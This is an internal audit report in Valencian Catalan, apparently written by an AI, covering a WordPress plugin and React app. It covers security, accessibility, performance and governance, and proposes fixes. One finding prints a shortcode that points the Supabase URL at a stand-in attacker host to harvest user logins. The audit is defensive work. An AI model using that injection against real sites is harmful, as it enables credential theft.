---
tipus: document
estat: esborrany
description: ESTUDI CLAUDE - AUDITORIA INTERNACIONAL
---
```yaml
doc_id: SDP-GEN-BASE-001
doc_type: "ESTUDI_INTERN_IA"
authoring_agent: "Claude"
version_semver: 1.4.0
owner: Consell de la Petorreta
domain: global
subdomain: architecture
locale: ca-valencia
objective: Auditoria Internacional del Sistema complet
scope: Tot el sistema, arquitectura i disseny actual.
hora_creacio: "19:32"
hora_modificacio: "19:32"
exif_cognitiu:
  estat_emocional_sistema: "Auditoria"
  entorn_operatiu: "Entorn_Dev_Local"
  nivell_entropia: "Controlat"
academic_metadata:
  revisors_ia: ["Claude"]
  data_aprovacio_humana: "2026-09-03"
  bibliografia_interna_radicals: []
  nivell_maduresa: "Consolidat"
inputs: ["260903_1908_BUNDLE_auditoria.md"]
constraints: []
acceptance_criteria: []
anti_patterns: []
fallback_behavior: []
evaluation_metrics: []
test_vectors: []
change_log: []
```

# ESTUDI CLAUDE - AUDITORIA INTERNACIONAL

#### 0 · VERIFICACIÓ PRÈVIA DEL BUNDLE

He extret els 438 cossos i recalculat els sha256 contra el manifest abans de llegir res. **438/438 coincidixen.** Zero absents, zero extra, zero divergències de bytes. El `sdp.bundle.v2` és byte-fidel: la crida «no cal creure el capçal» es sosté. Açò tanca definitivament el defecte històric del bundle no verificable.

---

#### 1 · NOTA BASE: **6,5 / 10**

Desglossada, perquè la mitjana amaga la forma real:

| Dimensió | Nota | Raó en una línia |
|---|---|---|
| Infraestructura de verificació | 9,0 | Bundle criptogràfic + 35 portes encadenades sense cap porta morta |
| Arquitectura de frontera (host/port/relé) | 7,5 | Ben pensada, amb una cursa i una finestra d'injecció fràgil |
| Seguretat d'aplicació | **3,5** | Dos P0 explotables des de fora |
| Accessibilitat real (no declarada) | **4,0** | La llei més sagrada del projecte no la veu cap detector |
| Rendiment sobre iPad A10 | 5,0 | ~400 KB de ProseMirror i una dependència morta |
| Coherència doctrina ↔ codi | 5,5 | La capçalera ISO contradiu el bundle en quatre punts |
| Governança documental | 8,5 | Deute comptabilitzat, honest, amb trinquet |

El sistema **meta** està millor construït que el sistema. Eixa és la frase que resumix l'auditoria.

---

#### 2 · P0 · FORATS EXPLOTABLES

##### 2.1 · Origen de Supabase injectable des d'un shortcode

`wordpress-plugin/soc-de-poble.php` fa una llista blanca escrupolosa per a l'atribut `config`:

```php
$permeses = array( 'theme', 'lang', 'dataMode', 'showMenu', 'layout' );
```

I dèsset línies més avall accepta açò **sense cap llista blanca**:

```php
'supabase_url'      => defined('SDP_SUPABASE_URL') ? SDP_SUPABASE_URL : '',
'supabase_anon_key' => defined('SDP_SUPABASE_ANON_KEY') ? SDP_SUPABASE_ANON_KEY : '',
```

`shortcode_atts()` deixa que qualsevol atribut escrit al shortcode sobreescriga el valor per defecte. Qualsevol usuari amb `publish_posts` (rol Autor) escriu:

```
[soc_de_poble supabase_url="https://collidor.exemple" supabase_anon_key="x"]
```

`sanejaConfig()` a `PedraSecaEmbed.jsx:169` valida el **protocol**, mai l'**origen**: `https://collidor.exemple` passa net. A partir d'ací `loginWithEmail` envia el correu i la contrasenya reals de l'usuari al servidor de l'atacant, des del domini de confiança de la víctima. Els mateixos atributs estan registrats al bloc de Gutenberg, així que també s'arriba per interfície gràfica.

La ironia mecànica: el comentari KSES del mateix fitxer raona amb precisió per què `fonts-href` i `config-id` són perillosos, i `supabase-url` és estrictament més perillós que tots dos.

**Correcció:** trau `supabase_url` i `supabase_anon_key` de `shortcode_atts()` i del `register_block_type`. Que isquen **només** de les constants PHP. Si vols conservar multi-entorn, afig una llista blanca d'orígens al costat servidor i compara amb `===`, exactament com ja fas al relé.

##### 2.2 · El sanejador que funciona segons l'ordre de renderitzat

`detailRichText.jsx` té dos camins:

```js
sanitizeHtml(raw)          // ALLOWED_TAGS, FORBID_TAGS, ganxo afterSanitizeAttributes
DOMPurify.sanitize(html)   // ← renderPageHtml, línia 51: configuració per defecte
```

`posaGanxos()` només s'executa dins de `sanitizeHtml()`. `DOMPurify.addHook` és **estat global**. Conseqüència: si la primera cosa que renderitza la sessió passa per `renderPageHtml`, no hi ha ganxo — passen `<svg>`, `style`, `srcset` i fars de tercers. Si abans s'ha renderitzat qualsevol node amb `sanitizeHtml`, el ganxo ja està posat i el camí feble queda protegit per accident.

**Un control de seguretat el comportament del qual depén de quina pàgina ha visitat l'usuari primer no és un control: és una moneda a l'aire.**

I hi ha una pista de per què va passar: `renderPageHtml` injecta `style="max-width:100%;border-radius:18px;..."` a mà. Si haguera passat per `sanitizeHtml`, `FORBID_ATTR: ['style']` li hauria esborrat les seues pròpies imatges. Es va triar el sanejador dèbil per a acomodar una infracció de la doctrina.

**Correcció:** una sola porta. `renderPageHtml` retorna HTML **sense** `style`, amb una classe (`.detail-img`), i tot ix per `sanitizeHtml`. Mou `posaGanxos()` a la càrrega del mòdul.

---

#### 3 · P1 · LES TRES LLEIS QUE NO VEUEN LES SEUES PRÒPIES INFRACCIONS

Ací està el patró que porteu mesos perseguint, viu i documentat amb números.

##### 3.1 · `font-too-small` és llei dura i és cega

```js
const LLEIS_DURES = new Set(['tailwind-visual', 'font-too-small']);
const FONT_SMALL  = /font-size\s*:\s*(\d+(?:\.\d+)?)px/gi;
```

Tolerància zero. Reporta **0 infraccions**. He comptat a `index.css` **44 declaracions per davall de 16 px** — totes en `rem`: `0.85rem`, `0.8rem`, `0.75rem`, `0.7rem`, i `.avatar-xs` a `0.6rem` (9,6 px). Diverses combinades amb `color: var(--sdp-text-suau)`. Xicotet i suau alhora, per a un lector de 55–80 anys al sol.

El regex només mira `px`. Tota l'escala tipogràfica real del projecte és `rem`. La llei dura és una porta tancada amb clau en una paret que no existix.

##### 3.2 · La Llei de Vida té dos mesuradors que es contradiuen

| Porta | Regla | Veredicte |
|---|---|---|
| `tractor-pedra-seca.mjs` | `LLEI_04_VIDA` — llei **DURA**, zero deute | **0 infraccions** |
| `design_guard.mjs` | `touch-too-small` — **admet deute** | **7 infraccions sancionades** |

El mateix mandat físic — cap control per davall de 44 px — mesurat per dos sistemes independents que donen 0 i 7. I la que troba infraccions és precisament la que té permís per a tolerar-les.

El `0` de `LLEI_04_VIDA` tampoc és compliment. El seu detector és:

```js
/\b(min-height|min-width|height|width)\s*:\s*(\d+)px/g
```

Només `px` literal. Qualsevol control dimensionat amb `var(--sdp-…)`, `rem`, `%`, o per `padding` + `line-height` és invisible. El zero mesura la ceguesa del detector, no la salut del codi.

##### 3.3 · El guardià protegix el color que el cànon va rebutjar

`design-tokens.json` diu literalment: *«Va substituir #0984E3 per accessibilitat»*. El cànon és `#016ebf`.

- `design_guard.mjs:40` — `ALLOWED_HEX` conté `'#0984E3', '#0984e3'`. **No conté `#016ebf`.**
- `index.css:101` — comentari: *«to exacte del cànon #0984E3»*.

Tres fonts de veritat per a un color, i la porta protegix la que es va retirar per inaccessible. Escriure el blau correcte cru seria denunciat; escriure el blau rebutjat passa net.

##### 3.4 · Tokens canònics que no consumix ningú

Anàlisi creuada de 167 tokens definits contra 161 usats:

- `--sdp-touch-min` (44 px) — **definit, mai usat**. El que s'aplica és `--sdp-touch`, una variable de Capa 1 que cap porta lliga al cànon.
- `--sdp-font-min` (16 px) — **definit, mai usat**. Que els `input` estiguen a `1rem` i no disparen l'auto-zoom d'iOS és coincidència, no mecanisme.
- `--sdp-border-clar` — **usat sense fallback i mai definit**. Eixa declaració la descarta el parser en silenci.

La Capa 0 és decorativa. Els dos mínims físics del projecte existixen com a documentació dins d'un fitxer generat que ningú llig en temps d'execució.

---

#### 4 · P1 · EL QUE DIU EL VOSTRE PROPI FULL DE DEUTE

No cal que jo jutge l'estat d'integració. `.sollutia-deute.json` ho diu:

```json
"endpoints_actius": [], "taules_sincronitzades": [],
"errors_pendents": [4 elements], "proves_passades": false
```

Zero endpoints. Zero taules. Proves en fals. I la capçalera ISO d'aquesta mateixa auditoria declara `nivell_maduresa: "Consolidat"` i `data_aprovacio_humana: "2026-09-03"` — aprovació humana signada el mateix dia que es demana l'auditoria.

Afegint la resta del full: 103 estils en línia, 33 colors crus, 179 classes òrfenes, 276 classes forasteres, 81 literals de ruta orfes, 68 documents orfes a l'estucat, 11 infraccions de Tailwind en un sistema que es declara sense Tailwind.

El trinquet (el deute pot baixar, mai pujar) és bon disseny. El defecte és que **una línia base congelada convertix una infracció en un dret adquirit permanent**: sense data de caducitat, sense responsable, sense calendari de reducció, eixos 103 estils en línia ja són legals per sempre.

I dos gates compten el mateix i no coincidixen: `inline-style: 103` contra `LLEI_03_ESTIL_EN_LINIA: 97`.

---

#### 5 · P2 · RENDIMENT I PUERSA (iPad A10)

##### 5.1 · Dependències que no fan res

```json
"@supabase/supabase-js": "^2.112.4",   // ← ZERO imports en tot el repositori
"postcss-prefix-selector": "^2.1.1"    // ← cap postcss.config.*, cap referència
```

`supabaseBackend.js` treballa amb `fetch()` cru contra `/rest/v1` i `/auth/v1`. La dependència més pesada de l'arbre és pes mort, i està a `dependencies`, no a `devDependencies`. Llevar-les és guany net immediat: menys instal·lació, menys superfície de cadena de subministrament, i una infracció de Pedra Seca menys.

##### 5.2 · ProseMirror sobre un A10

`@tiptap/react` + `@tiptap/starter-kit` són ~350–450 KB minificats. Sobre un iPad A10 això no és pes de descàrrega, és **temps de parseig i compilació de JS en un nucli de 2016**. És la decisió tècnica que més s'aparta de «altament optimitzat per a dispositius antics».

##### 5.3 · L'editor de notes perd text mentres s'escriu

`NotesEditor.jsx` munta TipTap i, en el mateix component, tres camps amb aquesta forma:

```jsx
<span contentEditable suppressContentEditableWarning
      onBlur={e => saveNoteField(id, 'title', e.currentTarget.innerHTML)}
      dangerouslySetInnerHTML={{ __html: sanitizeHtml(activeNote.title || '') }} />
```

`dangerouslySetInnerHTML` reemplaça els fills del node a cada re-render. TipTap dispara estat a cada pulsació. El resultat mecànic: el cursor salta a l'inici i, com que l'única desada és `onBlur`, **es perd tot el que s'havia escrit des del focus**. Per a la usuària objectiu escrivint un paràgraf amb el dit, açò és pèrdua de dades, no una molèstia.

També són dos models d'edició incompatibles dins d'un sol component: ProseMirror per al cos, `contentEditable` cru per als encapçalaments.

##### 5.4 · Profunditat de DOM (la petició «Anti-Divs Fantasmes»)

Indentació JSX màxima per fitxer, que és cota **inferior** de la profunditat renderitzada (no compta la composició entre components ni l'embolcall del shadow root):

```
UniversalComponents.jsx   ~12 nivells
NotesEditor.jsx           ~11 nivells
App.jsx                    ~9 nivells
MurSection.jsx             ~7 nivells
```

El límit declarat és 7. `UniversalComponents.jsx` és el pitjor infractor i és, precisament, el component del qual pengen tots els altres: cada nivell que li lleves el multipliques per tota l'aplicació.

##### 5.5 · Cursa a l'arrencada i caiguda per doble definició

`host.js` — `arrenca()` és `async` i marca la fase **després** de l'`await`:

```js
const supabaseImpl = await import('./data/supabaseBackend.js');
setBackendImplementation(supabaseImpl);
freezeImplementation();
fase = FASE.SEGELLAT;      // ← finestra oberta durant tot l'await
defineCustomElement();
```

Tres conseqüències: (a) una segona crida durant l'`await` travessa el guard i crida `defineCustomElement()` dos voltes → `NotSupportedError`; (b) un `configura()` que arribe dins d'eixa finestra queda sobreescrit en silenci per Supabase; (c) si l'`import` falla, el `catch` només fa `console.error` i **continua**: es congela un backend buit i l'aplicació es pinta sencera amb totes les crides de dades fallant.

I `exposaGlobal()` usa `defineProperty` amb `writable:false, configurable:false`. Dues instàncies del bundle en una pàgina (bloc + shortcode) → `TypeError` dur a la segona.

El comentari diu «tick de microtasques»; el codi fa `setTimeout(…, 0)`, que és macrotasca. La finestra real és més gran que la documentada — però la promesa «un `<script>` col·locat després del bundle encara arriba a temps» **només val per a scripts síncrons**. Amb `defer`, `async` o `type=module` — que és com WordPress encua per defecte amb `in_footer` — el host arriba tard i `configura()` llança.

---

#### 6 · EL QUE ESTÀ BEN FET (i que cal no tocar)

No tot és deute, i seria deshonest no dir-ho amb la mateixa precisió:

- **`public/auth/callback.html`** és la millor peça del bundle. Llista blanca per igualtat exacta, retorn per fragment i no per query, `sdp_path` sanejat contra `#`, `\`, `..`, `//` i longitud, i un comentari que explica per què `startsWith` seria robatori de sessions. Això és enginyeria de seguretat de veres. **Avís operatiu:** la secció d'orígens de Sollutia està buida, així que l'entrada amb Google no funciona en cap desplegament de soci. Està documentat, però no és «Sollutia-first».
- **`tractor-cromatic.mjs`** calcula contrast real i imposa 7:1 als tokens de text. És una porta que fa el que diu.
- **`run-portes.mjs`**: `spawnSync` amb array d'arguments (res de shell), agregatiu en lloc de fail-fast. He verificat mecànicament les tres coses: 0 scripts apuntant a fitxers inexistents, 0 fitxers a `tooling/gates` sense entrada npm, 0 portes declarades fora de la cadena. **El problema històric de les portes mortes està tancat.**
- **RLS** activat a les 6 taules amb 15 polítiques.
- **`sanitize.js`** amb `netejaText` separat i el raonament explícit de per què no passar text pla per DOMPurify: correcte i poc habitual de vore.
- **El full de deute** és una confessió honesta amb números. Molt pocs projectes en tenen.

---

#### 7 · IMAGINACIÓ ANALÍTICA · CINC OPCIONS

##### 7.1 · La Porta Cega — *metaporta que audita les portes* ⭐

És la idea que ataca l'arrel de tot l'apartat 3. Crea `tooling/fixtures/infraccions/` amb violacions plantades a mà: un `font-size: 0.7rem`, un botó de `32px` fet amb `var()`, un `<span>` amb `style` en línia, un shortcode amb `supabase_url` forà, un color `#0984E3`.

Una porta nova executa cada tractor **contra eixe directori i exigix que falle**. Si un tractor passa sobre una infracció plantada, la Porta Cega falla i nomena el detector cec.

Amb açò, «llei dura amb 0 infraccions» deixa de ser ambigu: o el codi està net, o el detector està trencat, i sabràs quin dels dos. Aplicat hui, marcaria immediatament `font-too-small` i `LLEI_04_VIDA` com a cecs. **És la peça que li falta al sistema per a deixar de repetir el mateix diagnòstic cada mes.**

##### 7.2 · Deute amb data de caducitat

Cada entrada del full de deute guanya dos camps: `caduca` i `responsable`.

```json
"inline-style": { "max": 103, "caduca": "2026-12-01", "responsable": "javi" }
```

Passada la data, la porta falla encara que el número no haja pujat. Convertix un dret adquirit en un préstec. Sense açò, les 103 infraccions d'estil en línia són permanents per disseny.

##### 7.3 · Escala tipogràfica tancada

Elimina el problema de l'apartat 3.1 fent-lo impossible en lloc de detectable. Cap `font-size` amb valor literal: només `var(--sdp-text-*)`, i el token més xicotet de l'escala **és** `--sdp-font-min`. La porta passa de buscar números xicotets (que se li escapen per unitats) a prohibir literals (que no se li escapen mai). El mateix truc val per a `--sdp-touch-min` i les dimensions de control.

##### 7.4 · Pressupost de pes per maquinari

Un tractor que mesura `wordpress-plugin/dist/soc-de-poble.standalone.js` i falla si passa d'un llindar calibrat al pressupost de parseig d'un A10. «Optimitzat per a iPad A10» deixa de ser aspiració i es torna número. Amb el llindar posat, la conversa sobre TipTap la decidix la porta, no l'opinió.

##### 7.5 · Frontera d'origen segellada en compilació

Enfront del P0 2.1: incrusta la llista d'orígens Supabase permesos com a constant en temps de construcció i que `sanejaConfig` rebutge qualsevol origen que no hi siga, **independentment** d'on vinga l'atribut. Defensa en profunditat: encara que algú reobri la porta al PHP, el component la tanca. Reutilitza exactament el patró que ja funciona al relé.

---

#### 8 · DAFO EN CINC DIMENSIONS

##### 8.1 · Social
**F:** l'ancoratge territorial i els 30 anys d'El Rentonar donen una legitimitat que cap producte comparable pot comprar. **D:** el sistema promet accessibilitat radical i entrega 44 declaracions per davall de 16 px i 7 controls sense focus visible sancionats; l'usuària major encara no té el que se li ha promés. **A:** una demo davant d'un ajuntament amb text de 9,6 px destruïx la credibilitat més ràpid que qualsevol argument tècnic. **O:** l'accessibilitat verificada mecànicament és un diferenciador que cap plataforma corporativa pot exhibir amb proves.

##### 8.2 · Personal
**F:** disciplina documental extraordinària i honestedat amb el deute. **D:** **169 fitxers de tooling contra 100 de `src`.** El sistema de govern pesa més que el producte que governa. 35 portes, 12 IA al consell, cicles formals d'auditoria — per a una aplicació que encara no té cap endpoint actiu. **A:** el risc real d'aquest projecte no és tècnic, és que el meta-sistema es convertisca en el projecte i el producte no arribe mai al poble. **O:** el meta-sistema ja està fet i verificat; a partir d'ara pot deixar de créixer i començar a rendir.

##### 8.3 · Tècnic
**F:** bundle criptogràficament verificable, cadena de portes sense forats estructurals, relé OAuth exemplar, RLS complet. **D:** dos P0 explotables, tres lleis cegues, dues dependències mortes, una cursa d'arrencada. **A:** el patró «gate que certifica el que no verifica» ha reaparegut sobre la llei més protegida del sistema; sense la Porta Cega, tornarà. **O:** cap dels defectes trobats és arquitectònic. Tots són reparables en dies, no en mesos — l'estructura aguanta.

##### 8.4 · Econòmic
**F:** AGPL, zero cost de llicència, arquitectura que un desenvolupador pot mantindre. **D:** `proves_passades: false` a la frontera amb el soci; sense integració no hi ha producte que facturar ni desplegar. **A:** una sol·licitud a NGI0 avaluada contra un repositori amb credencials injectables des d'un shortcode és rebutjable per motius de seguretat, no de visió. **O:** l'infraestructura de verificació — bundle signat, deute comptabilitzat, portes mecàniques — és exactament el que els avaluadors de fons públics volen vore i quasi mai troben. **Val la pena presentar-la com a artefacte propi, no com a detall d'implementació.**

##### 8.5 · Futurs
**F:** l'ADR d'Online-First és honest sobre el peatge acceptat. **D:** la capçalera ISO d'aquesta mateixa auditoria encara declara «PWA fora de xarxa» i «local-first sense dependències de núvol», contradient l'ADR que el mateix repositori conté. **A:** documentació que descriu un sistema que no existix és el mecanisme pel qual la pròxima IA del consell auditarà una ficció. **O:** una porta que compare les afirmacions de la plantilla ISO amb els ADR vigents tancaria eixa deriva d'arrel.

---

#### 9 · DADA D'APRENENTATGE

La lliçó d'aquesta ronda no és cap dels defectes individuals. És aquesta:

> **Una llei dura amb zero infraccions i una llei tova amb set infraccions poden estar mesurant el mateix mandat. Quan passa, el zero no és salut: és la mida de la ceguesa del detector.**

Ho porteu diagnosticant en prosa des de fa mesos amb el nom de «Saber ≠ Fer». Avui té números: `LLEI_04_VIDA = 0` contra `touch-too-small = 7`, sobre la Llei de Vida, que és la que menys us podeu permetre no vore.

I el corol·lari operatiu, que és el que canvia la manera de treballar:

> **Cap porta nova hauria d'entrar a la cadena sense una infracció plantada que demostre que sap fallar.**

---

#### 10 · ORDRE D'EXECUCIÓ

1. Treu `supabase_url` / `supabase_anon_key` del shortcode i del bloc. *(minuts — tanca el P0 d'exfiltració)*
2. Una sola porta de sanejament; `posaGanxos()` a la càrrega del mòdul. *(minuts — tanca el P0 no determinista)*
3. Desinstal·la `@supabase/supabase-js` i `postcss-prefix-selector`. *(minuts — guany net)*
4. Construïx la **Porta Cega** i deixa que et diga quins altres detectors són cecs. *(hores — evita la pròxima ronda sencera)*
5. Repara `font-too-small` i `LLEI_04_VIDA` amb l'escala tancada del punt 7.3.
6. Arregla la cursa de `host.js`: assigna `fase` abans de l'`await`, i fes `exposaGlobal` idempotent.
7. Trau els tres `contentEditable` de `NotesEditor` o lleva'ls el `dangerouslySetInnerHTML`.
8. Alinea la capçalera ISO amb l'ADR Online-First.
